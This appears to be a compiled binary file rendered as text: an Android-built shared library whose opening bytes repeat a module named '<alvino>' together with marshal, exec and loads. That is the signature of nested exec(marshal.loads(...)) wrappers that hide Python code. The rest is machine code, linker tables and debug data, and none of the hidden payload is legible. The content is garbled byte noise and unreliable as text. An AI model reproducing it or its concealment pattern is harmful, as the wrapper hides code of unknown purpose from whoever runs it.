 r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s   )ÚmarshalÚexecÚloads© r   r   ú<alvino>Ú<module>   s    __test__   ;                   Sƒìè    [Ã+  ƒ,şÿÿ‰$è’  ƒÄ[ÃÃéëÿÿÿSƒìè    [ÃË*  ‹D$…ÀtÿĞƒÄ[ÃSƒìè    [Ã«*  ƒìƒ,şÿÿ‹,ÕÿÿPÿt$Qè&  ƒÄ[ÃSƒìè    [Ã{*  ƒ,şÿÿPÿt$ÿt$ÿt$è  ƒÄ[ÃÌÌÌU‰åSƒäğƒìè    [ÃE*  ƒô  ‰$èì  eü[]ÃU‰åSWVƒäğƒì è    [Ã*  èÓ  ‹@‰$èØ  ‹‹H  ‹³D  ‰÷!Ïƒÿÿt'1Æ1Ñ	ñt6‹ƒĞÿÿÿ‹ ‹6ÿşÿ‰L$‰$è±  éZ  ‰ƒD  ‰“H  !Ğƒøÿ„C  ‹ƒ`  …Àtÿ é4  ‹MƒDşşÿ‰D$‰$è  …À„  ‰Æ‰$è}  ‰Çÿu‰4$è  …ÿ„õ  ‰|$‰<$è{  ‰D$…À„Í  ƒ- ÿÿ‰D$‹E‰$è*  …À„8  ‰Ç‰D$ƒsşşÿ‰D$‹D$‰$èF  ‰Æÿu‰<$è  …öˆ~  ƒ4 ÿÿ‰D$‹E‰$èÛ  …À„  ‰Ç‰D$ƒOşşÿ‰D$‹D$‰$è÷  ‰Æÿu‰<$èÉ  …öˆ/  ƒˆışÿ‰D$‹E‰$èŒ  …À„Ö   ‰Ç‰D$ƒ~şşÿ‰D$‹D$‰$è¨  ‰Æÿu‰<$èz  …öˆà   ƒXşşÿ‰D$‹E‰$è=  …À„¥   ‰Ç;ƒÔÿÿÿt9‰|$ƒ–şşÿ‰D$‹D$‰$èQ  ‰Æÿu‰<$è#  …öˆ‰   ‹D$é’   1öÿuéëß‹ƒØÿÿÿ‹ ‰$è*  …Àtdè1  éÜşÿÿ‹ƒØÿÿÿ‹ ‰$è  …ÀtFè  éÿÿÿ‹ƒØÿÿÿ‹ ‰$èî  …Àt(èõ  é>ÿÿÿ‹ƒØÿÿÿ‹ ‰$èĞ  …Àt
+è×  éwÿÿÿ‹D$ÿu‰$è‚  1Àeô^_[]ÃU‰åSWVƒäğì  è    [Ã@'  ‹u‹‹Üÿÿÿ‹‰„$  ‹ƒ`  …Àt09ğ„Ø  ‹ƒàÿÿÿ‹ ‰Î‹’ışÿ‰L$‰$èå  ‰ñ¸ÿÿÿÿéT  ‰L$ƒIşşÿ‰D$D$<‰$ÇD$
+   ÇD$   ÇD$   è'  è2  ‰D$ƒışÿ‰D$|$8‰<$ÇD$   è   ŠD$<:D$8u
+ŠD$>:D$:tT‰|$ƒ=şşÿ‰D$D$<‰D$ƒêşşÿ‰D$|$@‰<$ÇD$È   è¸  ‰|$ÇD$   Ç$    èÀ  …Àˆö  Ç$    è¼  ‰ƒd  ÇD$    …À„  »ïÿşÿ‰<$ÇD$    è   ‰ƒh  …À„è  ‰<$ÇD$    è’  ‰ƒl  …À„Ô  ‰³`  ÿ‰4$èä  ‰ƒp  …À‹L$„¼  ÿ ƒÀÿşÿ‰$èb  ‰ƒt  …À„°  ÿ ƒÛşşÿ‰$èD  ‰ƒx  …À„œ  ÿ ‹ƒ`  ‹‹t  ‰L$‹T ÿÿ‰L$‰$è"  …Àˆ  ³Dşÿÿ¿Ø  ¶Fı
+Füt€~ş t1‹Fğ‰$èö  ëd‹Fğ‹NôI‰L$‰$è  ëK‹Vø‹Fğ‹NôI…Òt‰T$‰L$‰$ÇD$    èº  ë‰L$‰$èl  ‹Nì‰‹Fì‹ …À„x  ‰$è–  ƒøÿ„g  ƒ> v…Qÿÿÿ‹ƒäÿÿÿƒ8 t*‹ƒ`  ‹‹|  ‹“€  ‰T$‰L$‰$èd  …Àˆ-  èg  …À„  ‰Æ»=şşÿ‰|$‰$è[  …Àu‹ƒ`  ‰D$‰|$‰4$èA  …Àˆò  ‹ƒ°  ‰D$Ç$   è3  ‰ƒœ  …À„¼  ‹³„  Ç$    è#  ÇD$    ¿ş  …À‹L$„˜   ‰D$,‹ƒ`  ‰$èÈ  ÇD$$    …À„ƒ  ‰D$(‰t$0èë  …À¾    „k  ‰Á‹D$,‰D$‰L$‹D$(‰D$‹D$0‰$ÇD$    ‰ÎèÂ  ‰D$$é6  1Àé  ÇD$    ¿¦  ë¿Ö  ÇD$    ‹L$‹ƒ`  …À„»   ƒ»p   „?  è‚  ‰Æ‹ƒx  …À‰t$4„
+  ‹N4‰L$$‹N8‰L$,‹N<‰L$0ÇF4    ÇF8    ÇF<    ‰$èL  …À„ä  ‰D$(‹ ‹H‹P3“¸  3‹´  	Ñ…  ‹ƒ¼  …À„&  ;ƒèÿÿÿ„<  ;ƒìÿÿÿ„2  ‰$è  …À…   é  ‰Îè  ‰ñ…À…š  ‹ƒĞÿÿÿ‹ ‹Šşşÿ‰L$‰$è  éy  ¿ê  éñşÿÿ¿İ  éçşÿÿ1ö‹D$,ÿu‰$è  …ötÿu‰4$è  ‹t$$…ö‹L$„Áşÿÿ‹ƒp  ‹‹„  ‰t$‰L$‰$è‡  …Àˆ6  ÿu‰4$èÃ  ‹ƒŒ  ‹‹  ‹“p  3J3B	È…†  ‹“”  …Ò„³  ÿ‹ƒ˜  ‹J‹IH…É‰T$$„k  ‰D$‰$ÿÑ‰ÆÇD$    …À„n  ‹D$$ÿu‰$èP  ‹“œ  ‰ñè  ‹I‰D$$…À‰„w  …Éu‰4$è&  è‘  …À„p  ‰Ç‹t$$‰ñ‰Âèª	  ÿt~ÿ„Š   …À„–   ÿu‰$èê  è5  …À„D  ‰Æ‹ƒp  ‹‹   ‰t$‰L$‰$èo  ‹I…À‰xh…É‹L$…ì  ‰4$è¢  ‹L$éÛ  ¿   ÇD$    ÿëI‰4$‰Æè~  ‰ğÿ…vÿÿÿ‰<$‰Æèj  ‰ğ…À…jÿÿÿÇD$    ¿  éıÿÿÇD$    ¿   …É‹L$…ıÿÿ‰4$‰Îè+  ‰ñéòüÿÿ¿ª  éÜüÿÿ¿«  éÒüÿÿ¿¬  éÈüÿÿ¿Ğ  ÇD$    éÂüÿÿ¿Ò  é¬üÿÿ¿Ô  é¢üÿÿ‹ƒx  ‹‹¨  ‹P‹RH…Ò„7  ‰L$‰$ÿÒ‰Æ…À„:  ‰4$è;  …ÀuG‹ƒìÿÿÿëE‹‹¨  ‹Q‰T$‰L$‰$èF  ‰ƒ¼  ‹L$(‹	òAòƒ´  …À…Ïüÿÿéğ   ‹ƒèÿÿÿ‰D$(ÿu‰4$èJ
+  ‹t$4‹D$(;ƒèÿÿÿ…¬üÿÿéã   ¿á  ééûÿÿ¿ã  éßûÿÿ‹‹„  èr  ë9‰D$‰$èÔ  ‰ÆÇD$    …À…’ıÿÿ¿
+  ‹t$$ÿé£şÿÿ‹‹„  è·  ‰Â…À…:ıÿÿÇD$    ¿  é…ûÿÿÇD$    ¿  éhşÿÿ¿  ‹t$$ÿéZşÿÿ¿  éQûÿÿ‰L$‰$èS  ‰Æ…À…Æşÿÿè´	  ‹t$4‹ƒx  ‹‹¨  ‹“èÿÿÿ‰T$‰L$‰$èN
+  1ÿ‹F4‰ñ‹v8‹Q<‰T$(‹T$$‰Q4‹T$,‰Q8‹T$0‰Q<…Àtÿu‰$è	  …ötÿu‰4$è	  ‹D$(…Àtÿu‰$èô  ‰|$(÷ßC|$ ‰|$$…ÿt+‹ƒÈ  ‰D$,…Àt‹³À  ‰ğHˆÒ   ‹L$$‹T$,9Lòü}}‹D$(…À„R  ‰D$ƒÉÿşÿ‰D$ƒŠşşÿ‰D$ƒ ÿÿ‰$èd
+  …À„–  ‰Ç‰$èb
+  …À„  ‹L$ ‰L$‰D$ƒ# ÿÿ‰$èP
+  ‰Æÿ…  ‰<$è>  é  …À~C‰t$01öë9ñ‰È~5‰Á)ñ‰ÊÁêÊÑúò‹L$,‹|Ñ;|$$‰ÑÛ}r‰ÁëÒ‰t$0‹D$,‹x1Ò1À;|$$œÀÂ;T$0‹|$4ÿÿÿ‹D$$‹L$,9DÑ…ÿÿÿ‹D$,‹4Ğÿ‹ƒp  ‰D$‰t$‰<$ÇD$    è£	  ‰Ç…Àt‹D$ ‰G8‰<$è	  …ötÿu‰4$èn  …ÿ„€   ÿu|‰<$èZ  ër‹D$ ‰D$ƒŠşşÿ‰D$ƒ# ÿÿ‰$è8	  ‰Æ…ötLƒ|$$ „«  ‹ƒÈ  …À‰t$(„¢  ‹³À  ‰÷Oˆ˜   ‹L$$9Lğü‰òŒï   …ÿ€   ‰t$01ÒëN‹ƒ`  …À‹L$tÇƒ`      ÿu‰$‰ÎèÀ  ‰ñƒ»`  À‹	;Œ$  …y  eô^_[]Ã9Ñ‰Ï~9‰ş)Ö‰ñÁéñÑùÑ‹tÈ;t$$‰L$,İ}b‹L$,Q‰ùëĞ‰t$0‹pÇD$,    1É;t$$œÁ‹T$,Ê‹t$09ò‰×}=‹L$$‰ú9Løu3‹Ğ‹t$(‰4Ğÿ	u‰$è$  ‹|$4‹t$(éfşÿÿ‹T$,‹t$09ò‰×|Ã‰ú;³Ä  u<‰T$,õ   ‰L$‰$è  …À‹|$4„¦   ƒÆ@‰ƒÈ  ‰³Ä  ‹³À  ‹T$,‰t$09Ö~#‹L$0‰×‹TÈø‹tÈü‰tÈ‰È‰úI9ùè‹L$$‰LĞ‹t$(‰4Ğ‹D$0@‰ƒÀ  ÿ‹|$4éÂıÿÿÇ$   è§  …À„;ÿÿÿ‰ƒÈ  ÇƒÄ  @   ÇƒÀ     ‹L$$‰H‹t$(‰0ë¸‹t$(é|ıÿÿèx  U‰åSWVƒäğƒì‰Îè    [Ãñ  ‹ƒt  ‹H‹IHƒì…ÉtVPÿÑƒÄ‰Ç…Àt‰øeô^_[]ÃVPè¥  ƒÄ‰Ç…Àuæ‹ƒğÿÿÿƒì‹; ÿÿVQÿ0è  ƒÄëÉU‰åSVƒäğ‰Îè    [Ãu  ƒìÿqQÿ³p  è8  ƒÄ‹‹p  òAòƒŒ  ‰ƒ”  …Àt	ÿ eø^[]Ãèê  …Àu	‰ñèÿÿÿëç1ÀëãU‰åSWVƒäğƒì‰Îè    [Ã  ‹A‹x@…ÿt>‰T$ƒìƒşşÿPèi  ƒÄ…Àu>ƒìj ÿt$Vÿ×ƒÄ‰Æè\  …öt‰ğeô^_[]Ãƒìj RVèR  ƒÄëçèX  …Àt1öëØ‹ƒôÿÿÿƒì‹•ÿşÿQÿ0èi  ƒÄëàU‰åSWVƒäğƒì è    [Ãc  ‹³p  ÿ‹ƒ`  ‰$è  …À„»   ‰t$‹pNˆƒ   ‰D$ëN‹D$xp‹@‹<°‰|$‹D$‰$èÓ  …Àuß‹ƒ`  ‹OöAWt5‹H‹IH…Ét+‰|$‰$ÿÑ…ÀtJ‰D$‰D$‰|$‹D$‰$è‘  …Àyë‰|$‰$èŸ  …ÀuÒëÿ‹t$u5ë+‹D$ÿu‰$è¯  ‹D$ÿt%‹t$…öt-ÿ‰ğ¾    u‰$èŒ  ‰ğeô^_[]Ã‰$èz  ‹t$…öuÓ1öëâU‰åSWVƒäğƒì ‰Îè    [Ã1  ‹ƒÜÿÿÿ‰D$‹ ‰D$…Òt'‰×;“Ôÿÿÿt‹Gö@W u‹‹øÿÿÿƒì“ğÿşÿéƒ   ‹»p  ‹ƒ¤  ƒìÿpPWè²  ƒÄ…Àu$‹ƒ¤  ‰D$èœ  ƒìPÿt$Wè~  ƒÄ…Àxo‹F;ƒüÿÿÿtAÇD$    ÇD$
+   ‹HT÷Á   ua1Ò÷Á   us‹‹øÿÿÿƒì“áışÿÿpRÿ1èİ  ë ‹F4ƒx ~s‹ƒøÿÿÿƒì‹ŸşşÿQÿ0è+  ƒÄ1ö‹D$‹ ;D$ue‰ğeô^_[]ÃÇD$   ƒìVèÿ  ƒÄ‰Æ…À‰ÂtÌ‰T$ƒÆƒìD$Pèğ  ƒÄƒì…Àt&D$Pë!ƒìWWVèä  ƒÄ‹L$‹	;L$tè0  j WWh  VèÑ  ƒÄ ‰Æ‹D$…À„jÿÿÿÿ…bÿÿÿƒìPè¯   ƒÄéQÿÿÿÌÌÌ    ÿ³   ÿ£   ÿ£   h    éàÿÿÿÿ£   h   éĞÿÿÿÿ£   h   éÀÿÿÿÿ£   h   é°ÿÿÿÿ£   h    é ÿÿÿÿ£    h(   éÿÿÿÿ£$   h0   é€ÿÿÿÿ£(   h8   épÿÿÿÿ£,   h@   é`ÿÿÿÿ£0   hH   éPÿÿÿÿ£4   hP   é@ÿÿÿÿ£8   hX   é0ÿÿÿÿ£<   h`   é ÿÿÿÿ£@   hh   éÿÿÿÿ£D   hp   é ÿÿÿÿ£H   hx   éğşÿÿÿ£L   h€   éàşÿÿÿ£P   hˆ   éĞşÿÿÿ£T   h   éÀşÿÿÿ£X   h˜   é°şÿÿÿ£\   h    é şÿÿÿ£`   h¨   éşÿÿÿ£d   h°   é€şÿÿÿ£h   h¸   épşÿÿÿ£l   hÀ   é`şÿÿÿ£p   hÈ   éPşÿÿÿ£t   hĞ   é@şÿÿÿ£x   hØ   é0şÿÿÿ£|   hà   é şÿÿÿ£€   hè   éşÿÿÿ£„   hğ   é şÿÿÿ£ˆ   hø   éğıÿÿÿ£Œ   h   éàıÿÿÿ£   h  éĞıÿÿÿ£”   h  éÀıÿÿÿ£˜   h  é°ıÿÿÿ£œ   h   é ıÿÿÿ£    h(  éıÿÿÿ£¤   h0  é€ıÿÿÿ£¨   h8  épıÿÿÿ£¬   h@  é`ıÿÿÿ£°   hH  éPıÿÿÿ£´   hP  é@ıÿÿÿ£¸   hX  é0ıÿÿÿ£¼   h`  é ıÿÿÿ£À   hh  éıÿÿÿ£Ä   hp  é ıÿÿÿ£È   hx  éğüÿÿÿ£Ì   h€  éàüÿÿÿ£Ğ   hˆ  éĞüÿÿÿ£Ô   h  éÀüÿÿÿ£Ø   h˜  é°üÿÿÿ£Ü   h   é üÿÿÿ£à   h¨  éüÿÿÿ£ä   h°  é€üÿÿÿ£è   h¸  épüÿÿÿ£ì   hÀ  é`üÿÿÿ£ğ   hÈ  éPüÿÿ` Ø& ˆ           Ü& •           à& ¨           Ì& ³           ´& ¹  	         ¸& Â           °& Ê  	         ä& Ó  Ä          Ô& íÙ  	                             Pê  ê     !          £             ûÿÿo      ¼     0        úÿÿo      ì     Ğ     4                     
+  
+   ¸  õşÿot     ¤     ,       ğÿÿo¼  şÿÿoT  ÿÿÿo                                                           4         Æÿ  Öÿ  æÿ  öÿ      &  6  F  V  f  v  †  –  ¦  ¶  Æ  Ö  æ  ö    & 6 F V f v † – ¦ ¶ Æ Ö æ ö   & 6 F V f v † – ¦ ¶ Æ Ö æ ö   & 6 F V                    q          „& \&                ë     àí              ÿÿÿÿÿÿÿÿAndroid (7714059, based on r416183c1) clang version 12.0.8 (https://android.googlesource.com/toolchain/llvm-project c935d99d7cf2016289302412d708641d52d2f7ee) clang version 13.0.1 Linker: LLD 13.0.1  H   å    0Ÿå   ı    Wı   Y   tY  ^   P^  Ş   t        Ñ   Û    PÛ   L   Vf  „   V          	   P	  î   t          !   P          X   tf  „   t          X   Ÿf  „   Ÿ             P        &  L    ŸL  X   Vf  „    Ÿ        &  0   P0  X   Wf  l   P        m  p   P        `  §   t„  ¢   t        `  §   Ÿ„  ¢   Ÿ        f  m   P        u  ›    Ÿ›  §   V„  ¢    Ÿ        u     P  §   W„  Š   P        ¼  ¿   P        ¯  ö   t¢  À   t        ¯  ö   Ÿ¢  À   Ÿ        µ  ¼   P        Ä  ê    Ÿê  ö   V¢  À    Ÿ        Ä  Î   PÎ  ö   W¢  ¨   P             P        ş  M   t^  f   tÀ  Ş   t        ş  M    Ÿ^  f    ŸÀ  Ş    Ÿ             P          A    ŸA  M   V`  f   VÀ  Ş    Ÿ             P  M   W^  f   WÀ  Æ   P        A  M   W`  f   W        -  >    Ÿ7  ä	    Ÿä	  è	   Wè	  1
+    ŸL
+  
+    Ÿ?  ‡    Ÿ‡     W  Ğ    ŸĞ  ×   W×  á    Ÿ        -  >   0Ÿ7  æ	   0Ÿè	  1
+   0ŸL
+  
+   0Ÿ?  ‰   0Ÿ  Ò   0Ÿ×  á   0Ÿ        -  >    Ÿ7  ä	    Ÿä	  è	   t è	  1
+    ŸL
+  
+    Ÿ?  ‡    Ÿ‡     t   Ğ    ŸĞ  ×   t ×  á    Ÿ        -  2   0Ÿ7  f	   0Ÿf	  r	   P†	  ‹	   0Ÿ‹	  •	   P•	  ×	   V×	  ä	   0Ÿè	  í	   Pí	  ü	   V"
+  /
+   VL
+  
+   0Ÿ?  ‡   0Ÿ  Ğ   0Ÿ×  á   P        -  >   0Ÿ7   	   0Ÿ 	  J	   VJ	  O	   0ŸO	  Y	   PY	  r	   Wr	  ä	   0Ÿè	  
+   W
+  /
+   0ŸL
+  
+   0Ÿ?  n   0Ÿn  ‡   V  µ   0Ÿµ  Ç   VÇ  Ğ   P×  á   0Ÿ        -  :   0Ÿ7  m   0Ÿm  q   t$q  ­   V­  İ   0Ÿ 	  -	   0Ÿ-	  4	   P4	  j	   t$j	  ×	   0Ÿ×	  è	   Vè	  ô	   t$ô	  /
+   0ŸL
+  
+   0Ÿ?  `   0Ÿ‡     V  ™   0Ÿ™  ›   P›  µ   Rµ  Ğ   t$Ğ  ×   V×  á   0Ÿ          #   P#  W   V          Õ   0ŸÕ  ä   Pä  	   Q	     V          ¸   0Ÿ¸  Ì   PÌ  ô   t(ô  ü   P             0Ÿ     t$             0Ÿ  ª   Pª     t,          ä   Ÿä      Ÿ             0ŸM  m   0Ÿ          Ğ   VĞ  ü   t0ü     P        ¦  ª   Pª     t,M  m   t,        Y     0Ÿ
+  ?   0Ÿá  ¿   0Ÿ¿  
+   V  :   0Ÿ:  U   VU  ‚   t(Ò  =   t(=  L   VY  ä   t(ä  ı   Vı  6   t(6  :   V        Y     0Ÿ
+  ?   0Ÿá  ß   0Ÿß  
+   W  ‚   0ŸÒ  :   0Ÿ        `  l   Vl     t4
+  ?   t4á  |   t4        `  l   Vl     t4
+  ?   t4á  ‚   t4Ò  :   t4        ¤  °   P°  Ú   t(
+  –
+   PÑ
+  ô
+   t(ô
+  ö
+   Q        Ò  æ   Pê
+     P  ?   t(        ã  ş   P`  l   P        æ  é   Q        f	  j	   Vè	  í	   V        j	  r	   Wô	  
+   W           "    Ÿ$  |   W        |  €   W€  ‚   t(Ò  :   t(        ä	  è	   V‡     VĞ  ×   V        ä	  è	   V‡     VĞ  ×   V        œ
+  ³
+   Pá  í   P        œ
+  ³
+   Qá  í   Q        Ÿ
+  ¢
+   R        µ
+  É
+   V  &   Vï      V        $  7   t$7  >   R        $  >   t,>  E   R        $  E   t0E  X   R        $  7   t$7  >   R        $  >   t,>  E   R        $  E   t0E  X   R        '  X   P        ,  |   V        /  3   R3  |   t(        ‹  º   t$7  ¿   t$        £  º    Ÿ7  C    ŸC  V   Re  ~   R~  ‹    Ÿ        £  º    Ÿ7  C    ŸC  ~   V~  ‹    Ÿ        £  º   t$7  –   t$        £  º   t,7  –   t,        £  º   V7  ?   V?  ~   t0~  ‚   V‚  –   t0        ¦  º   P7  C   PC  T   QT  †   P        ş     P        À  ì   0Ÿì  ö   Pö  7   W  :   0Ÿ        À  "   0Ÿ"  7   V  :   0Ÿ        À  Ğ   P        –  ¿   R        ½  ¿   V        O  ‚   PÒ  L   PY  ë   Pı  :   P        C  a   Vı  6   V        C  ‚   t$Ò  :   t$        a  ‚    ŸÒ  Ø   t,ç  ó   Qó     t,      Ÿ        a  ‚    ŸÒ     R      Ÿ        a  ‚   t$Ò  *   t$        a  ‚   PÒ  *   P        a  ‚   VÒ     t0     V  $   t0$  *   V        d  ‚   WÒ  Ö   QÖ  (   W          ˜   P           (   R(  L   W]  e   Re  i   W        —  ©   V        ­  ±   V±  ¹   t0¹  Ñ   Q        ^  j   Vj  s   Qs  Á   óQŸ        p     P”  ›   P        s  v   Q        †  ‘   W   Á   W        Ú  æ   Væ  ø   Qø  7   óQŸ        ø     P!  &   P        @  h   Rh  k   t~     t˜  š   t¢  ®   R®  ³   óRŸ³  É   t        N  Z   VZ  w   Q¢  ®   Q        `  Ÿ   W¢  Ü   W          ˜   V³  ¼   VÀ  Ü   V        ş     V  *   tE  M   P          *   P             vŸ  ­   V±  Í   Vî  ú   V        =  §   W±  Á   W        W  w   W•  §   W        W  s   P•  ¡   P        c  f   Q        s  {   P{  •   t¡  §   Pµ  Á   P        Å  É   Pî  ö   P        Å  É   Pî  ö   P        Í  Ñ   Vú  ş   V        Ñ  Õ   VÕ  Ü   P          @   R@  e   Wk  -   W0  É   W          *   V*  W   QW  e   óQŸe  ~   Q~     óQŸ0  L   óQŸL  S   Vq  ‹   óQŸ        :     0Ÿ0  S   0ŸS  q   Vq  ‹   0Ÿ  ¤   V        :     0Ÿ0  F   0ŸF  L   VL  P   RP  V   tq  ‹   0Ÿ          k   0Ÿk  è   Wõ     W0  ‹   W  É   W        (  0   P¤  É   V        ¨  Á   P        °  Á   P        %  4 I?:;  $ >  4 I:;  :;   I:;8   I:;   I  	 I:;8  
+:;  & I  '   I  I'   I:;  I:;  (       <   I'  I  ! I7  $ >  .  .@—B:;'I   :;I  4 :;I  
+ :;  1XYW  4 1      1  ! 1  " 1XYW  #1UXYW  $ 1  %4 1  &
+ 1  'U  (‰‚ 1  )‰‚ “B  *‰‚1  +Š‚ ‘B  ,4 I:;  -:;  .! I7  /:;  0 I:;8  1.@—B:;'I?  2.:;'I<?  3.:;'I   44 :;I  5.:;'   6 :;I  7. :;'I<?  8:;  9 I:;8  :.:;'<?  ;.:;'I<?  <. :;'<?  =  >
+ :;  ?   @ :;I  A :;I  B4 :;I  C.:;'I   D :;I    1       ”   ¢      Ë  àê  É  í  8   €& «  ¯  Q   ¦(& y  4
+K	  Æ   
+L ü  ò  
+M<  ò  
+Nr  6  
+O  >  
+P 9   N  
+Q$ò  
+
+  
+R(I  0  
+S,B  ×  
+T0 Ñ     
+1  
+,    
+  
+- 2   4  
+.=  6  
+/L    
+0   Ï  mm	  iÚ  6  k Ç  W  l A  !	  kL    €8   ú  >\  g  0  B$  Ì¿    Ê  À û  ò  ÁŞ  6  Â   6  ÂŸ    Æä  6  Çà    È Ï  D  É$  i  Ê(n    Ì,¡  &  Ğ0ş  L  Ñ4  Y  Ò8¿  ·  Ö<
+    ×@
+    ØD¤   İ  ÙH  è  ÚL^  ó  İP°   
+  àT¹   ò  âX   
+
+  æ\õ  0  é`À   O
+  ídú  6  ğh  t
+  ólš  
+  ôp1  Š
+  ÷t1  Ó
+  øx<  İ
+  ù|  l  û€     ü„  q  ıˆÏ   |  şŒQ  6  ÿ	*   ‡   ”	V	  ’  ˜	<  ²  œ	G  ×   	  0  ¤	"    ¨	Ï    ¬	Ü     °	å     ´	'    	¸	    
+¼	.
+  î  À	+    Ä	_	  õ  È Õ  ¿  v
+s    
+  t Š  6  u ÷  ü  ©    ª  É     
+  *  ,	  Ê/      ?   ü  O  a  ÌT  8     ?     n  y  ’  ²
+­  ®  ® Ü  ®  ¯  ®  °Ú
+  É  ± ¹  ˆ  ¸¾       Ô    «Ù  î         ú  â  8   {å   ë  Ö     ¹  8	  Î+  6  Ü  •
+hß  ë  m æ  ë  nm  ë  op  ë  pò  ë  qv    rü  ®  s}  ®  tù  ®  u #  0  v$  ®  w(â
+  ë  x,ì
+  ë  y0÷  ë  z4  ë  {8+  ë  |<¹  ®  }@  K  ~DA	  ®  H  ë  LË  ë  ‚Pß  ë  ƒT!  ë  „X’    …\"  ë  †`ú  ë  ‡d  ë  ˆhÀ  ë  ‰lá  ë  Šp  ë  Œtë  ë  x  ë  |	  ë  €›   ®  ‘„y  ë  “ˆó  ë  ”Œ ö  ®  ¹û           ¡  º           ;  ò  »@  8      Q  \  L  £
+(—
+  Ù  ˜ 6  ë  ™4  ô  š£  ô  ›5  K  œ@    ì  K    9  Ÿ   ë  ¡ ı  ô  ¢$ ä     ¼é  6     ÿ  (  ½      6       ¿$  8     6     D  -  ÃI  8        ^  i    ©
+¥µ  Ù  ¦ ö
+  ë  §‰  ’  ¨   «  Á¢  8          Â     ÏÇ  Ò     6  Õ  tö  8  Ë  ­  Íø  	  ®  ·
+´Ú   	  µ ï  ç	  ¶ +	  ç  @0	  8     E	  8    J	  U	  (  >)  ,1  K  2 º    3/  6  4(  6  53  8   7B  8   8Œ  ?  9   â	  :¾  â	  ; >  â	  <$  K  =( 6  ò	  ß  A÷	    E	   ¹  
+    Å
+  8     /
+  K   :
+      Ä?
+  8     K   Z
+  Ç  Ğ_
+        8    ¹    Ñ¹  
+  Ò
+  È  #4  ò  $ ñ  È
+  %¦  8   &ù  ò  ( ö  J	  Ø
+    â
+  E  )
+  ò   Ë  '    G    ò  ş  K   2  I  7      K   R  k  	W  8       K   g    <  Ó  ï  Ô  2  Õ  ;  ×¢    W  6   ½    ÖÂ    W       â    Èç  K   Ö     ã  C        )     $    î  E  	.9    C  
+  È  *S    
+=“  8   
+> ó   K  
+? 3  †  —„& C  ’   E  ù   «  Ÿ\& ·  ’   S    
+@  Ö  Lx&  á    Cì  ˜  .Ó  )    |”& àí  H  U@  ˆ8   ¼  *  À& A    È& ‘	  ˆ  Ï  @  ‘8   S  a  ò  ¯  &  8   6  Ğ    ß  ‡         Œ  1  &°ö  X  2’ù  q%  Kî  µ   ¦t<~%  t8Š%  ´î  L   tÀ —%    x  rï     Ç V   x  ï     Ñ P   x  ¬ï     Ó P   x  Êï     Õ P   Ü%  ğ  ¾   Ø½%  ğ  ¾   è!Ê%    ôğ  C     Í  á   "ò%  7ñ     ê#&  €   ş$³  &  $“  !&  $q  -&  %»  9&  %ğ  E&  %&  Q&  %F  ]&  %İ  i&  &u&  -ó    1ó     ™"  1ó     7	   =ó     š"  Aó     7	  #~&  ˜   ,$h  “&  %	  